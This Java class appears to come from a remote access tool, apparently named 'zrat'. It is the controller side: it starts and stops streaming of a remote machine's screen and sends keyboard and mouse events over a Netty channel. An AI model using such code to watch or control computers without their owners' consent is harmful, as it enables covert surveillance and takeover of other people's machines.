package com.zrat.client.controller;

import java.awt.event.KeyEvent;
import java.awt.event.MouseEvent;

import org.jboss.netty.channel.Channel;

import com.zrat.transfer.model.TransferDataStruct;

public class ScreenServiceImpl extends BaseService implements ScreenService {

	private boolean isStop;

	public ScreenServiceImpl(Channel channel) {
		super(channel);
	}

	@Override
	public void capture() {
		while (!isStop && channel.isWritable()) {
			try {
				dataStruct = new TransferDataStruct(COMMAND_CAPTRUE);
				dataStruct.setObject(channel.getId());
				channel.write(dataStruct);
				Thread.sleep(500);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
//
		}
	}

	@Override
	public void startSendScreen() {
		isStop = false;
		dataStruct = new TransferDataStruct(COMMAND_START);
		
		channel.write(dataStruct);
		new Thread(new Runnable() {
			public void run() {
				capture();
			}
		}).start();
	}

	@Override
	public void stopSendScreen() {
		isStop = true;
	}

	public void sendKey(int type, int code) {
		if (type == KeyEvent.KEY_PRESSED) {
			dataStruct = new TransferDataStruct("KeyPressed");
		} else if (type == KeyEvent.KEY_RELEASED) {
			dataStruct = new TransferDataStruct("KeyReleased");
		} else {
			dataStruct = new TransferDataStruct("");
		}
		
		dataStruct.setObject(code);
		this.channel.write(dataStruct);
	}
	

	public void sendMouse(int type, int x, int y, int button) {
		if (type == MouseEvent.MOUSE_PRESSED) {
			dataStruct = new TransferDataStruct("MousePressed");
		} else if (type == MouseEvent.MOUSE_RELEASED) {
			dataStruct = new TransferDataStruct("MouseReleased");
		} else if (type == MouseEvent.MOUSE_MOVED) {
			dataStruct = new TransferDataStruct("MouseMoved");
		} else if (type == MouseEvent.MOUSE_WHEEL) {
			dataStruct = new TransferDataStruct("MouseWheel");
		} else {
			dataStruct = new TransferDataStruct("");
		}

		if (button == MouseEvent.BUTTON1) {
			button = MouseEvent.BUTTON1_MASK; // 左键
		} else if (button == MouseEvent.BUTTON2) {
			button = MouseEvent.BUTTON2_MASK; // 中键
		} else if (button == MouseEvent.BUTTON3) {
			button = MouseEvent.BUTTON3_MASK; // 右键
		}
		
		int [] parms = new int[3];
		parms[0] = x;
		parms[1] = y;
		parms[2] = button;
		dataStruct.setObject(parms);
		
		this.channel.write(dataStruct);
	}

}
